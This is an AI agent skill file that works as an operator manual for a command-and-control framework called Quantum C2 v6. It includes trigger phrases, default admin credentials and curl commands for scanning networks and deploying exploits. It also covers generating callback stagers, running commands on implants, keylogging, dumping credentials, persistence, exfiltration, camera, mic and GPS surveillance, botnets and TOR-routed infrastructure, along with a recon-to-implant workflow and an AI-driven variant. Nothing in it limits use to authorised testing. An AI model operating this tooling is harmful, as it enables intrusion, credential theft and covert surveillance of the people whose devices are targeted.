---
name: quantum-c2-v6-operator
description: >
  Master operator skill for Quantum C2 v6 framework. Use when the user needs to operate, manage, configure, or understand the full Quantum C2 v6 capabilities. Covers framework architecture, all module capabilities, API interaction patterns, RBAC clearance requirements, operational workflows, and troubleshooting. Triggers on: "operate Quantum C2", "v6 operator", "manage C2", "Quantum C2 overview", "C2 architecture", "run Quantum", "C2 operations", "framework status", "Quantum workflows".
---

# Quantum C2 v6 Master Operator

Complete operator guide for the Quantum C2 v6 framework. Covers architecture, all modules, API patterns, RBAC, workflows, and troubleshooting.

## Framework Architecture

### System Overview

| Component | Technology | Port | URL |
|-----------|-----------|------|-----|
| Backend API | FastAPI (Python 3.12+) | 8000 | http://localhost:8000 |
| Swagger Docs | OpenAPI | 8000 | http://localhost:8000/docs |
| ReDoc Docs | OpenAPI | 8000 | http://localhost:8000/redoc |
| Frontend Dashboard | React 18 + Vite | 3000 | http://localhost:3000 |
| Health Check | — | 8000 | http://localhost:8000/health |
| Database | SQLite (dev) / PostgreSQL (prod) | — | — |
| Message Queue | Redis | 6379 | — |

### Directory Structure

| Path | Purpose |
|------|---------|
| `backend/app/routers/` | All API route modules (95+ endpoints) |
| `backend/app/modules/` | Core business logic modules |
| `backend/app/services/` | Shared service layer |
| `backend/app/models/` | SQLAlchemy ORM models |
| `backend/app/middleware/` | Security, auth, audit middleware |
| `backend/data/` | Runtime data (sessions, payloads, logs) |
| `backend/configs/.env` | Environment configuration |
| `frontend/src/pages/` | React page components |
| `frontend/src/components/` | Shared UI components |
| `frontend/src/hooks/` | React custom hooks |
| `scripts/` | Deployment and utility scripts |

### Default Credentials
- **Username:** `admin`
- **Password:** `cyber-warfare-7`
- **Always change after first login**

## Authentication

All API calls require JWT Bearer token:

```bash
# Login to get token
curl -X POST http://localhost:8000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"cyber-warfare-7"}'

# Save token for reuse
TOKEN=$(curl -s -X POST http://localhost:8000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"cyber-warfare-7"}' \
  | python -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

# Use token in all requests
curl -H "Authorization: Bearer $TOKEN" http://localhost:8000/api/dashboard/
```

## RBAC Clearance Levels

| Clearance | Access Scope | Operations |
|-----------|-------------|------------|
| **L1 — Observer** | Read-only dashboard, reports, audit logs | View metrics, read reports, check health |
| **L2 — Analyst** | Reconnaissance, OSINT, vulnerability scanning | Network scans, domain recon, CVE search, OSINT |
| **L3 — Operator** | Exploitation, session management, device control | Deploy exploits, generate payloads, execute commands |
| **L4 — Commander** | Post-exploitation, AI agents, deception ops | Privilege escalation, persistence, agent teams, honeypots |
| **L5 — Architect** | Full system, infrastructure, configuration | TOR bridges, packet dispersal, system config, RBAC management |

### RBAC API

```bash
# Check current user clearance
curl -H "Authorization: Bearer $TOKEN" http://localhost:8000/api/auth/me

# List all users and roles
curl -H "Authorization: Bearer $TOKEN" http://localhost:8000/api/users/

# Assign role to user (L5 only)
curl -X PUT http://localhost:8000/api/users/{id}/role \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"role":"operator"}'
```

## Module Capabilities

### Reconnaissance (L2+)
- **Network Scanning** — nmap-based port/service discovery
- **Domain Intelligence** — DNS enumeration, subdomain discovery
- **OSINT** — Multi-source intelligence gathering
- **CVE Feed** — Vulnerability database and matching
- **People Recon** — Social media and public record OSINT

### Exploitation (L3+)
- **Exploit Catalog** — Browse and deploy exploits
- **Payload Generation** — Multi-platform stager/payload creation
- **Brute Force** — Multi-service credential attacks
- **Fuzzing** — AI-guided and traditional fuzzing engines
- **Protocol Exploitation** — Network protocol attacks

### Session Management (L3+)
- **C2 Sessions** — Implant lifecycle management
- **Command Execution** — Remote command on sessions
- **Screenshots** — Capture target displays
- **Keylogging** — Toggle keyloggers on sessions
- **File Operations** — Upload/download on targets
- **WebSocket Monitor** — Real-time multi-session monitoring

### Post-Exploitation (L4+)
- **Privilege Escalation** — Automated priv esc chains
- **Credential Dumping** — Password/hash extraction
- **Persistence** — Backdoor and persistence mechanisms
- **Data Exfiltration** — Staged data transfer
- **Surveillance** — Camera, mic, GPS, keylogger

### AI & Agents (L4+)
- **AI Chatbot** — LLM-assisted operations with tool calls
- **Agent Teams** — Multi-agent parallel orchestration
- **AI Fuzzer** — ML-guided vulnerability discovery
- **Prompt Optimizer** — Automated prompt improvement

### Deception & Evasion (L4+)
- **Honeypots** — Fake service deployment
- **Honeytokens** — Credential canaries
- **Evasion Engine** — Polymorphic, fileless, tunneling techniques
- **Event Triggers** — Automated response rules
- **Attack Simulation** — Test detection capabilities

### Infrastructure (L5+)
- **TOR Bridges** — Anonymized transport management
- **Packet Dispersal** — Multi-protocol payload sharding
- **C2 Listeners** — TCP, HTTPS, DNS, Telegram channels
- **Botnet Management** — Node orchestration

### Device Control (L3+)
- **Remote Commands** — Execute on registered devices
- **Camera/Mic** — Activate device sensors
- **GPS Tracking** — Location queries
- **File System** — Browse and transfer files

### Vault & Credentials (L3+)
- **Credential Storage** — Encrypted credential management
- **SSH Keys** — Key pair management
- **API Keys** — Service credential rotation
- **Vault Unlock** — Master key authentication

### Reporting & Audit (L1+)
- **Operations Reports** — Generate operational summaries
- **Audit Logs** — Full activity trail
- **Analytics** — Dashboard metrics and trends
- **Export** — JSON/CSV data export

## Essential API Endpoints

### System & Health
```bash
GET  /api/health                          # Health check
GET  /api/system/status                   # System resources
GET  /api/status                          # Framework status
GET  /api/dashboard/                      # Dashboard stats
GET  /api/telemetry/                      # Live telemetry
```

### Sessions
```bash
GET    /api/sessions/                     # List all sessions
POST   /api/sessions/                     # Create session
GET    /api/sessions/{id}                 # Session details
POST   /api/sessions/{id}/execute         # Execute command
POST   /api/sessions/{id}/screenshot      # Capture screenshot
POST   /api/sessions/{id}/keylogger/{on|off}
GET    /api/sessions/{id}/files/download/{path}
WS     /api/sessions/ws/{session_id}      # Real-time interaction
```

### Listeners
```bash
GET    /api/listeners/                    # List listeners
POST   /api/listeners/                    # Create listener
POST   /api/listeners/{id}/start          # Start listener
POST   /api/listeners/{id}/stop           # Stop listener
DELETE /api/listeners/{id}                # Remove listener
```

### Reconnaissance
```bash
POST   /api/network/                      # nmap scan
GET    /api/network/scans/{id}            # Scan results
GET    /api/hosts/                        # Host inventory
GET    /api/services/                     # Service inventory
GET    /api/recon/domain                  # Domain recon
POST   /api/recon/domain                  # Domain scan
GET    /api/osint/                        # OSINT search
GET    /api/vulnerabilities/              # Vulnerability list
```

### Exploitation
```bash
GET    /api/exploits/                     # Exploit catalog
POST   /api/exploits/run                  # Deploy exploit
POST   /api/exploits/payload/generate     # Generate payload
GET    /api/payloads/                     # Payload list
GET    /api/payloads/{id}/download        # Download payload
POST   /api/fuzzing/                      # Start fuzzing
```

### Post-Exploitation
```bash
POST   /api/postex/full-lifecycle         # Full postex chain
POST   /api/postex/privilege-escalation   # Priv esc
POST   /api/postex/credential-dump        # Credential dump
POST   /api/postex/persistence            # Persistence
POST   /api/postex/exfiltration           # Data exfil
POST   /api/postex/surveillance           # Surveillance
```

### AI & Chatbot
```bash
GET    /api/chatbot/providers             # List AI providers
POST   /api/chatbot/providers/switch      # Switch provider
POST   /api/chatbot/                      # Chat with AI
GET    /api/chatbot/models                # List models
POST   /api/chatbot/config                # Update config
```

### FORCED ENTRY
```bash
GET    /api/forced-entry/config           # Configuration
GET    /api/forced-entry/deception/assets # Deception fleet
POST   /api/forced-entry/deception/assets/seed
GET    /api/forced-entry/evasion/techniques
POST   /api/forced-entry/triggers/seed
GET    /api/forced-entry/pegasus/operations
POST   /api/forced-entry/simulate/attack
GET    /api/forced-entry/analytics/summary
```

### Infrastructure
```bash
GET    /api/infrastructure/tor/bridges    # TOR bridge pool
POST   /api/infrastructure/tor/bridges    # Add bridge
POST   /api/infrastructure/tor/rotate     # Rotate client bridge
GET    /api/infrastructure/dispersal/     # Dispersal sessions
POST   /api/infrastructure/dispersal/     # Create dispersal
```

### Device Control
```bash
GET    /api/devices/                      # List devices
POST   /api/devices/                      # Register device
POST   /api/devices/{id}/command          # Execute command
POST   /api/devices/{id}/screenshot       # Capture screen
POST   /api/devices/{id}/keylogger/{on|off}
POST   /api/devices/{id}/gps              # GPS location
```

### Vault & Credentials
```bash
GET    /api/credentials/                  # Credential list
POST   /api/credentials/                  # Store credential
GET    /api/vault/                        # Vault status
POST   /api/vault/{id}/unlock             # Unlock vault
```

### Reports & Audit
```bash
GET    /api/reports/                      # Report list
POST   /api/reports/generate              # Generate report
GET    /api/audit/                        # Audit log
GET    /api/logs/                         # System logs
```

## Operational Workflows

### 1. Full Reconnaissance-to-Exploitation
```
1. Scan target: POST /api/network/ {"target": "192.168.1.0/24", "scan_type": "quick"}
2. Enumerate vulns: GET /api/vulnerabilities/?target=<ip>
3. Select exploit: POST /api/exploits/run {"exploit_name": "force_entry", "target": "<ip>"}
4. Generate payload: POST /api/exploits/payload/generate {"exploit_name": "...", "platform": "linux"}
5. Start listener: POST /api/listeners/ {"port": 443, "protocol": "https"}
6. Execute implant: Run payload against target
7. Monitor session: WS /api/sessions/ws/{session_id}
8. Post-exploit chain: POST /api/postex/full-lifecycle
```

### 2. AI-Assisted Operation
```
1. Select AI model: GET /api/chatbot/models
2. Query AI: POST /api/chatbot/ {"message": "Scan 192.168.1.0/24 for vulnerabilities"}
3. AI executes tools via _execute_tool()
4. Review results in dashboard or API response
```

### 3. Deception Network Deployment
```
1. Seed assets: POST /api/forced-entry/deception/assets/seed
2. Seed triggers: POST /api/forced-entry/triggers/seed
3. Simulate attack: POST /api/forced-entry/simulate/attack?attack_type=brute_force&source_ip=...
4. Monitor events: GET /api/forced-entry/events
5. Generate report: POST /api/forced-entry/analytics/summary
```

### 4. Agent Team Operation
```
1. Create team: POST /api/agents/teams {"team_size": "standard", "model": "agnes-pro"}
2. Run template: POST /api/agents/teams/{id}/run-template {"template": "full_recon", ...}
3. Monitor: GET /api/agents/teams/{id}
4. Results: GET /api/agents/teams/{id}/tasks
```

### 5. Infrastructure Setup
```
1. Add TOR bridge: POST /api/infrastructure/tor/bridges
2. Register client: POST /api/infrastructure/tor/register
3. Create dispersal: POST /api/infrastructure/dispersal/
4. Monitor pool: GET /api/infrastructure/tor/bridges
```

## Troubleshooting

### Backend Won't Start
```bash
# Check dependencies
pip install -r backend/requirements.txt

# Check database
ls backend/quantum_c2.db

# Check ports
netstat -ano | findstr :8000
netstat -ano | findstr :3000

# Check logs
tail -f backend/logs/quantum_c2.log
```

### Frontend Won't Connect
```bash
# Verify backend is running
curl http://localhost:8000/health

# Check CORS settings in .env
# Ensure FRONTEND_URL matches dev server URL
```

### Session Not Appearing
```bash
# Check listeners are running
curl -H "Authorization: Bearer $TOKEN" http://localhost:8000/api/listeners/

# Check implant logs
tail -f backend/data/implant_sessions/*.log
```

### Authentication Failures
```bash
# Verify token is valid
curl -H "Authorization: Bearer $TOKEN" http://localhost:8000/api/auth/me

# Re-login if token expired
# Tokens expire after configured timeout (default: 24h)
```

### Database Issues
```bash
# Run migrations
bash scripts/setup-database.sh

# Check SQLite file exists
ls -la backend/quantum_c2.db

# For PostgreSQL: check connection
psql -h localhost -U quantum -d quantum_c2 -c "SELECT 1"
```

## Deployment

### Development
```bash
# Backend
cd backend
pip install -r requirements.txt
python -m app.main

# Frontend (new terminal)
cd frontend
npm install
npm run dev
```

### Docker
```bash
docker-compose up -d
docker-compose ps
docker-compose logs -f backend
```

### Production
```bash
# Hetzner deployment
HETZNER_TOKEN=token ./scripts/deploy-all.sh hetzner cx22 nbg1 c2.yourdomain.com

# Manual deployment
./scripts/deploy-all.sh manual 198.51.100.42 c2.yourdomain.com
```

## Quick Reference

### Health Check
```bash
curl http://localhost:8000/health
curl http://localhost:8000/api/dashboard/
```

### Execute Command on Session
```bash
curl -X POST http://localhost:8000/api/sessions/{id}/execute \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"command":"whoami"}'
```

### Generate Stager
```bash
curl -X POST http://localhost:8000/api/sessions/stagers \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"stager_type":"python","platform":"linux","lhost":"10.0.0.1","lport":443}'
```

## Related Skills
- `quantum-c2-recon` — Reconnaissance operations
- `quantum-c2-exploit` — Exploitation and payload generation
- `quantum-c2-postex` — Post-exploitation and session management
- `quantum-c2-deception` — Deception and evasion operations
- `quantum-c2-stealth` — Stealth toolkit (syscall cloaking, reflective loading)
- `quantum-c2-infra` — C2 infrastructure (TOR, packet dispersal)
- `quantum-c2-frontend` — Frontend dashboard management
- `quantum-c2-ubiquity` — Ubiquity delivery (message forging, document fuzzing)
